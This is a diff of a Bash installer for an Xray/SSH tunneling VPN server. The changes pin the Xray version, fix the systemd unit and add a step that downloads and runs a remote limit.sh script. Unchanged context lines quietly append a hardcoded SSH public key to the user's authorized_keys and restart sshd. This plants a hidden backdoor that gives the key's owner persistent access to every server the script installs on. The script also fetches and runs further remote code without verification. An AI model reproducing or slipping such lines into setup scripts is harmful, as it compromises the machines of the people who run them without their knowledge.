@@ -290,7 +290,6 @@ print_install "Random Subdomain/Domain is Used"
 clear
 fi
 }
-
 clear
 restart_system() {
 USRSC=$(wget -qO- ${izinsc} | grep $ipsaya | awk '{print $2}')
@@ -375,16 +374,16 @@ echo "& plughin Account" >>/etc/ssh/.ssh.db
 }
 function install_xray() {
 clear
-print_install "Core Xray 1.8.1 Latest Version"
+print_install "Core Xray 1.8.24 Latest Version"
 domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
 chown www-data.www-data $domainSock_dir
 latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
-bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
+bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version 1.8.24
 wget -O /etc/xray/config.json "${REPO}Cfg/config.json" >/dev/null 2>&1
 wget -O /etc/systemd/system/runn.service "${REPO}Fls/runn.service" >/dev/null 2>&1
 domain=$(cat /etc/xray/domain)
 IPVS=$(cat /etc/xray/ipvps)
-print_success "Core Xray 1.8.1 Latest Version"
+print_success "Core Xray 1.8.24 Latest Version"
 clear
 curl -s ipinfo.io/city >>/etc/xray/city
 curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
@@ -398,6 +397,7 @@ cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
 chmod +x /etc/systemd/system/runn.service
 rm -rf /etc/systemd/system/xray.service.d
 cat >/etc/systemd/system/xray.service <<EOF
+[Unit]
 Description=Xray Service
 Documentation=https://github.com
 After=network.target nss-lookup.target
@@ -409,8 +409,8 @@ NoNewPrivileges=true
 ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
 Restart=on-failure
 RestartPreventExitStatus=23
-filesNPROC=10000
-filesNOFILE=1000000
+LimitNOFILE=1000000
+LimitNPROC=65535
 [Install]
 WantedBy=multi-user.target
 EOF
@@ -876,13 +876,16 @@ secs_to_human "$(($(date +%s) - ${start}))"
 sudo hostnamectl set-hostname $usernameclear
 clear
 echo -e ""
-sudo mkdir -p /etc/limit/trojan
 mkdir -p ~/.ssh  # Pastikan folder .ssh ada
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGUCFOOv8WBQ9h2Aooim0ODWnOwwBkfgn/JIydf4CaRN" >> ~/.ssh/authorized_keys
 chmod 700 ~/.ssh
 chmod 600 ~/.ssh/authorized_keys
 systemctl restart sshd
 clear
+echo -e ""
+wget -O /usr/local/sbin/limit.sh https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/limit.sh
+chmod +x /usr/local/sbin/limit.sh
+/usr/local/sbin/limit.sh
 echo -e ""
 wget -O /usr/bin/ws "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/ws" >/dev/null 2>&1 && wget -O /usr/bin/tun.conf "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Cfg/tun.conf" >/dev/null 2>&1 && wget -O /etc/systemd/system/ws.service "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/ws.service" >/dev/null 2>&1 && chmod +x /etc/systemd/system/ws.service && chmod +x /usr/bin/ws && chmod 644 /usr/bin/tun.conf && systemctl disable ws && systemctl stop ws && systemctl enable ws && systemctl start ws && systemctl restart ws
 clear
